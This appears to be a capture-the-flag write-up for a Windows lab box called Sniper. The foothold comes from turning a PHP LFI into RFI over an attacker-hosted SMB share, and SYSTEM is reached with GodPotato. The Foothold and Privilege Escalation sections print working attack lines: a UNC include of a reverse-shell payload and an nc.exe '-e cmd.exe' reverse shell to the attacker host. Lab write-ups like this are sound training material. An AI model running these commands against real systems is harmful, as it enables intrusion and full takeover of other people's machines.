# Sniper — Medium — Windows

**Date:** 07 - Aug - 2026

---
## Tags

`#windows` `#web` `#php` `#lfi` `#rfi` `#smb` `#session-poisoning` `#seimpersonate` `#godpotato` `#privesc`

---

## What I Know

| Item       | Detail                                                                                  |
| ---------- | --------------------------------------------------------------------------------------- |
| Target     | 10.129.46.130 (host: SNIPER)                                                             |
| OS         | Windows Server 2019 Standard                                                             |
| Open ports | 80, 135, 139, 445, 49667                                                                 |
| Services   | IIS 10.0 (80); MSRPC (135, 49667); NetBIOS-SSN (139); SMB (445)                          |
| Foothold   | LFI in blog `lang` param → RFI via anonymous SMB share (UNC include) → shell as `iUSR`   |
| User       | `NT AUTHORITY\iUSR` → `chris` (password reused, found in `db.php`)                       |
| Privesc    | `SeImpersonatePrivilege` → GodPotato → `NT AUTHORITY\SYSTEM`                             |
| Flags      | user.txt and root.txt both read as SYSTEM                                                |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.46.130
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-09 09:10 +0100
Nmap scan report for 10.129.46.130
Host is up (0.12s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 45.31 seconds
```

<img width="846" height="381" alt="image" src="https://github.com/user-attachments/assets/b8725015-ca5e-42e5-a87b-4da349aa0591" />

```
nmap -sCV -p80,135,139,445,49667 10.129.46.130
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-09 09:14 +0100
Nmap scan report for 10.129.46.130
Host is up (0.015s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-09T15:15:06
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: 7h00m01s

Nmap done: 1 IP address (1 host up) scanned in 108.46 seconds
```
<img width="1225" height="753" alt="image" src="https://github.com/user-attachments/assets/e79cc9d3-1539-4266-a2ef-cae05bd69fee" />

**What each port tells me:**
- **Port 80 (HTTP)** — IIS 10.0 serving a web application; the main attack surface, worth investigating first.
- **Port 135 (MSRPC)** — Standard Windows RPC endpoint mapper; not directly useful on its own, but confirms a typical Windows host with RPC exposed.
- **Ports 139, 445 (SMB)** — File-sharing surface; worth checking for anonymous access / leaked data (nothing readable without creds at this stage).
- **Port 49667 (MSRPC)** — A dynamic high-numbered RPC port auto-allocated by Windows; not directly actionable without specific RPC enumeration.

---
## Enumeration Log

```
OBSERVATION:
- Port 80 (IIS) is a web app worth investigating
- Port 135 is standard Windows RPC, skip for now
- Ports 139, 445 (SMB) worth checking for anonymous access / leaked data
- Port 49667 (MSRPC) is a dynamic high-numbered RPC port, skip for now
WHAT IT TELLS ME:
- Start with port 80, then SMB
WHAT I AM GOING TO TRY:
- Browse the port-80 app
- Try anonymous SMB
WHY: To understand each surface and find a foothold
RESULT:
- Port 80: a simple page for "Sniper Co."; several menu options, but only "Our Services"
  and "User Portal" lead to real landing pages
- "Our Services" is a blog page explaining the delivery service, with 3 tabs (Home,
  Language, Download). The interesting one is Language: selecting an option redirects to
  /?lang=blog-en.php, a parameter that loads a PHP file by name, so it could be
  susceptible to LFI/RFI
- "User Portal" is a login page (no creds yet), but the registration page lets me create
  a user and log in. The user area shows "under construction"
- SMB: no anonymous access
WHAT NEXT:
- Dir-fuzz for hidden directories that might leak information
- Check page source and JS for hidden hints
- Investigate the /?lang= endpoint for file inclusion
```

<img width="2055" height="961" alt="image" src="https://github.com/user-attachments/assets/1e9b9e04-8c83-4416-806e-07ae03dda1ae" />

<img width="1990" height="1010" alt="image" src="https://github.com/user-attachments/assets/8b06eac1-5f27-4ccc-a596-85f56485aef3" />

<img width="1719" height="769" alt="image" src="https://github.com/user-attachments/assets/9f383158-a690-4c2c-a863-33f18745308a" />

<img width="1962" height="1158" alt="image" src="https://github.com/user-attachments/assets/0b14b3ea-51e0-49e8-8f1c-f7bc9f534cf9" />

<img width="1757" height="1123" alt="image" src="https://github.com/user-attachments/assets/355ad139-dd57-4476-ac20-8c889ac5ebb0" />

<img width="1941" height="967" alt="image" src="https://github.com/user-attachments/assets/02150291-0589-4ee1-baf0-f3843224739d" />

<img width="516" height="564" alt="image" src="https://github.com/user-attachments/assets/3f08fc9e-4e25-4f22-a833-ba080973d2ae" />

<img width="612" height="115" alt="image" src="https://github.com/user-attachments/assets/1cc82c15-f573-417c-bc47-98eafebc74a9" />

```
OBSERVATION:
- Nothing interesting from dir-fuzz, source review, or JS
- Tech stack is PHP; on Windows, PHP sessions are typically stored at
  \Windows\Temp\sess_<Session_ID>
- Testing the lang parameter: absolute paths like \Windows\Temp\sess_<Session_ID> return
  content, while traversal payloads (../ or ....//// ) break the filter, so this is LFI
  with the traversal path sanitised, but absolute paths allowed
- Including my own session file returns my newly created username, i.e. attacker-controlled
  data lands in a file I can then include → classic PHP SESSION POISONING primitive
- But creating a user named <?php system("whoami") ?> throws an error, so the username is
  sanitised on registration → session poisoning is blocked here
- Pivoting to RFI: on Windows, PHP include() can resolve a UNC path (\\host\share\file.php)
  as a LOCAL file over the SMB redirector. This is NOT gated by allow_url_include (which
  only controls URL wrappers like http:// and ftp://, and here appears to be off). So even
  though http RFI fails, a UNC include from an anonymous SMB share still executes.
WHAT IT TELLS ME:
- Host a PHP reverse-shell on an anonymous SMB share on my box, then include it via the LFI
  using a UNC path to get code execution
WHAT I AM GOING TO TRY:
- Write a PHP reverse-shell file
- Stand up an anonymous SMB share serving it
- Trigger it through the lang parameter (UNC must use \\ so PHP parses it correctly), with a
  listener ready
WHY:
- To leverage the file inclusion into remote code execution as the web-server identity
RESULT:
- Got a shell as NT AUTHORITY\iUSR (the IIS anonymous user). Can't read the user home
  directories, so I'll need to reach chris (or escalate) for user.txt
WHAT NEXT:
- Enumerate for a path to chris / privilege escalation
```

<img width="2099" height="1004" alt="image" src="https://github.com/user-attachments/assets/501c510c-d01b-4aec-a665-a43470f25667" />

<img width="942" height="344" alt="image" src="https://github.com/user-attachments/assets/f2921c75-ae16-4eef-aea5-69d9f4efdf00" />

<img width="536" height="246" alt="image" src="https://github.com/user-attachments/assets/4f6aaaff-8b0f-4894-8e40-45133415fd4e" />

<img width="889" height="559" alt="image" src="https://github.com/user-attachments/assets/264d9426-320b-4896-8ef8-084c6c54fb2c" />

<img width="1585" height="470" alt="image" src="https://github.com/user-attachments/assets/122a217c-f6c6-4411-bf7f-bb70602a2cea" />

<img width="1648" height="650" alt="image" src="https://github.com/user-attachments/assets/4fb1aa78-ddc7-4442-aabc-89ccf719c8b3" />

<img width="1043" height="460" alt="image" src="https://github.com/user-attachments/assets/0e647af3-3ff9-424e-a258-b19a126849ca" />

<img width="835" height="930" alt="image" src="https://github.com/user-attachments/assets/a772b572-cc74-43ee-84f7-20ab188d86f3" />

```
OBSERVATION:
- winPEAS as iUSR shows SeImpersonatePrivilege is ENABLED → a token-impersonation ("potato")
  attack can escalate to NT AUTHORITY\SYSTEM. Host is Windows Server 2019 Standard, so
  JuicyPotato's old CLSID route is patched, GodPotato is the working variant
- Manual enum also found C:\inetpub\wwwroot\user\db.php holding a password; crackmapexec
  confirmed it as chris's password (credential reuse), a valid lateral route to chris
WHAT IT TELLS ME:
- Two options: laterally move to chris with the recovered creds, or use GodPotato to jump
  straight to SYSTEM and read both flags
WHAT I AM GOING TO TRY:
- Transfer GodPotato-NET4 (server uses .NET v4) and nc.exe, run GodPotato to spawn a
  SYSTEM reverse shell
WHY:
- SeImpersonatePrivilege on Server 2019 makes GodPotato a reliable, direct route to SYSTEM
RESULT:
- GodPotato returned a shell as NT AUTHORITY\SYSTEM. `whoami` failed to resolve, not a
  privilege issue but an empty PATH in GodPotato's non-interactive SYSTEM shell.
  %USERNAME% = SNIPER$ (machine account) and `set U` showing
  USERPROFILE=C:\Windows\System32\config\systemprofile both confirm SYSTEM
- Read both user.txt and root.txt
```

<img width="2242" height="169" alt="image" src="https://github.com/user-attachments/assets/833b98e4-914a-438f-9ea3-51d106270338" />

<img width="970" height="592" alt="image" src="https://github.com/user-attachments/assets/754cbb5a-a1eb-405c-ac22-d5e8473e41fa" />

<img width="754" height="324" alt="image" src="https://github.com/user-attachments/assets/20b7493a-8a99-41ae-ad2f-6f01a2749de2" />

<img width="961" height="333" alt="image" src="https://github.com/user-attachments/assets/b0d994ff-395d-432b-bce9-0de25ab8badb" />

<img width="1966" height="136" alt="image" src="https://github.com/user-attachments/assets/01dd659e-e401-474e-beba-f1458dfd0c68" />

<img width="1318" height="656" alt="image" src="https://github.com/user-attachments/assets/31b4c2f1-b153-4768-8214-23bff2ad896e" />

<img width="803" height="1155" alt="image" src="https://github.com/user-attachments/assets/4b427bf3-1784-42ce-a899-11706250a798" />

---

## Foothold

**How I got in:** The blog page's language selector loaded PHP files by name via `/?lang=blog-en.php`, and the parameter was passed into a PHP `include()`. Traversal payloads were filtered, but absolute paths worked, giving LFI. I first tried PHP **session poisoning** (including my own `\Windows\Temp\sess_<id>` file with PHP in the username), but registration sanitised the username, so that was blocked. I pivoted to **RFI over SMB**: I hosted a PHP reverse-shell on an anonymous SMB share on my box and included it through the `lang` parameter with a UNC path, executing as `NT AUTHORITY\iUSR`.

**Command / exploit used:**

```
# malicious payload (shell.php) hosted on an anonymous share
# e.g. a simple system()/reverse-shell one-liner

# anonymous SMB share on the attack box
impacket-smbserver share /tmp/share -smb2support

# trigger the include over UNC (note the double backslashes)
http://10.129.46.130/?lang=\\10.10.14.x\share\shell.php

nc -lnvp <LPORT>        # → shell as NT AUTHORITY\iUSR
```

**Why it worked:** The `lang` value reached `include()` without proper validation. Direct `http://` RFI was unavailable because `allow_url_include` was off, but **Windows PHP resolves a UNC path as a local file over the SMB redirector**, and that code path is *not* governed by `allow_url_include` (which only gates URL wrappers like `http://`/`ftp://`). Serving the payload from an anonymous SMB share therefore satisfied the include as if it were a local file, and PHP executed it server-side as the IIS anonymous identity `iUSR`.

---

## Privilege Escalation

**Path taken (iUSR → SYSTEM):** As `iUSR`, winPEAS showed **`SeImpersonatePrivilege`** enabled on a **Windows Server 2019 Standard** host running **.NET 4**. I transferred `GodPotato-NET4` and `nc.exe` and ran GodPotato to spawn a shell as **`NT AUTHORITY\SYSTEM`**, then read both `user.txt` and `root.txt`. (Enumeration also recovered `chris`'s reused password from `C:\inetpub\wwwroot\user\db.php`, confirmed with crackmapexec, a valid lateral route to `chris` and the intended user step but GodPotato reached SYSTEM directly.) SYSTEM was confirmed despite `whoami` failing on an empty PATH: `%USERNAME% = SNIPER$` and `USERPROFILE=C:\Windows\System32\config\systemprofile`.

**Command / exploit used:**

```
# from the iUSR shell, after staging GodPotato-NET4.exe + nc.exe
GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <LHOST> <LPORT> -e cmd.exe"
nc -lnvp <LPORT>        # → NT AUTHORITY\SYSTEM

# confirm creds route as an alternative
crackmapexec smb 10.129.46.130 -u chris -p '<db.php password>'
```

**Why it worked:** Service and IIS worker/anonymous identities such as `iUSR` hold `SeImpersonatePrivilege`, which lets a process impersonate a token it can obtain. A "potato" attack coerces a **SYSTEM-level NTLM authentication over DCOM/RPC** and impersonates the resulting token. On Server 2019 the older JuicyPotato technique was killed (the abusable CLSID/BITS behaviour was patched), so **GodPotato** which abuses the DCOM OXID resolver / RPC to obtain the SYSTEM token is the working modern variant, yielding full `NT AUTHORITY\SYSTEM`.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Exploited an LFI in the blog `lang` parameter and, with PHP session-poisoning blocked by input sanitisation, used RFI over an anonymous SMB share (UNC `include`) to run a PHP reverse shell as `NT AUTHORITY\iUSR`.
2. **Privesc technique in one sentence:** `iUSR` held `SeImpersonatePrivilege` on Server 2019, so a GodPotato token-impersonation attack escalated straight to `NT AUTHORITY\SYSTEM` (recovered `db.php` creds for `chris` were a valid alternate lateral route).
